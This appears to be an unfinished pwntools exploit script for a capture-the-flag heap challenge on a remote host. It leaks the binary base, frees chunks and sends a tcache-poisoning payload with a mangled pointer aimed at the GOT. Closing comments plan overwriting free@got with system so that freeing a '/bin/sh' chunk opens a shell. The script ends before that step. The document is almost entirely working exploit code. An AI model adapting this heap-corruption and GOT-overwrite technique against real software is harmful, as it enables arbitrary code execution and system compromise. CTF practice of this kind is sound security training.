from pwn import *

p = remote("kubenode.mctf.io", 31098)

def recv_menu():
    return p.recvuntil(b'> ')

def register(idx, count, size, data):
    p.sendline(b'1')
    p.recvuntil(b'Manifest ID (0-15): ')
    p.sendline(str(idx).encode())
    p.recvuntil(b'Item count: ')
    p.sendline(str(count).encode())
    p.recvuntil(b'Item size (bytes): ')
    p.sendline(str(size).encode())
    p.recvuntil(b'data:\n')
    p.send(data)
    recv_menu()

def view(idx):
    p.sendline(b'2')
    p.recvuntil(b'Manifest ID (0-15): ')
    p.sendline(str(idx).encode())
    res = p.recvuntil(b'\n\n===', drop=True)
    recv_menu()
    return res

def inspect(idx):
    p.sendline(b'3')
    p.recvuntil(b'Manifest ID (0-15): ')
    p.sendline(str(idx).encode())
    p.recvuntil(b'Validator    : ')
    validator = int(p.recvline().strip(), 16)
    p.recvuntil(b'Checkpoint   : ')
    checkpoint = int(p.recvline().strip(), 16)
    recv_menu()
    return validator, checkpoint

def delete(idx):
    p.sendline(b'4')
    p.recvuntil(b'Manifest ID (0-15): ')
    p.sendline(str(idx).encode())
    recv_menu()

recv_menu()
register(0, 1, 16, b'A'*16)
register(1, 1, 16, b'B'*16)
register(2, 1, 16, b'C'*16)
register(3, 1, 16, b'D'*16)

val, chk0 = inspect(0)
_, chk1 = inspect(1)

base_addr = val - 0x136c
win_func = base_addr + 0x14a8

delete(2)
delete(1)
delete(0)

puts_got = base_addr + 0x3600
fd = puts_got ^ (chk1 >> 12)

payload = b'A' * 24
payload += p64(0x21)
payload += p64(fd)

for i in range(2, 2000):
    payload = payload.ljust(i * 32 - 8, b'\x00')
    payload += p64(0x21)

payload = payload.ljust(65536, b'\x00')

p.sendline(b'1')
p.recvuntil(b'Manifest ID (0-15): ')
p.sendline(b'0')
p.recvuntil(b'Item count: ')
p.sendline(b'256')
p.recvuntil(b'Item size (bytes): ')
p.sendline(b'256')
p.recvuntil(b'data:\n')
p.send(payload)
recv_menu()

register(1, 1, 16, b'X'*16)

# We want to get a shell. The win function seems to just execute /usr/bin/uptime!
# Wait, let's look at what win_func does.
# 14b0: lea 0x21c9(%rip),%rdi # 3680 <exit@plt+0x24b0> -> /usr/bin/uptime
# 14b7: call 1150 <system@plt>
# So it just prints uptime. That's not what we want!
# We want to call system("/bin/sh").
# We can just overwrite a GOT entry with system, and pass "/bin/sh" as the argument!
# Wait! If we overwrite `puts@got` with `system@plt`, we can't easily pass "/bin/sh".
# But `delete` takes an ID, `view` takes an ID...
# What if we overwrite `free@got` with `system@plt`?
# And then we make a chunk content "/bin/sh\x00"?
# But `free` is called with the *chunk address* as the argument!
# And the chunk content IS "/bin/sh\x00"!
# YES!
# But `free@got` is at `0x35f8`. Is it 16-byte aligned? No, `0x35f8 % 16 = 8`.
# Is there a way to allocate at an unaligned address in tcache?
# tcache pointers must be aligned to 16 bytes.
# So we can't allocate exactly at 0x35f8.
# BUT we can allocate at `0x35f0`! (16-byte aligned).
# What is at 0x35f0?
# 0x35f0: nothing? Let's check objdump -R.
# 0x35f8 is free@got.
# If we allocate at 0x35f0, the 16 bytes of data will be at 0x35f0.
# The first 8 bytes will be at 0x35f0. The next 8 bytes will be at 0x35f8 (free@got)!
# So we can overwrite `free@got`!
p.close()
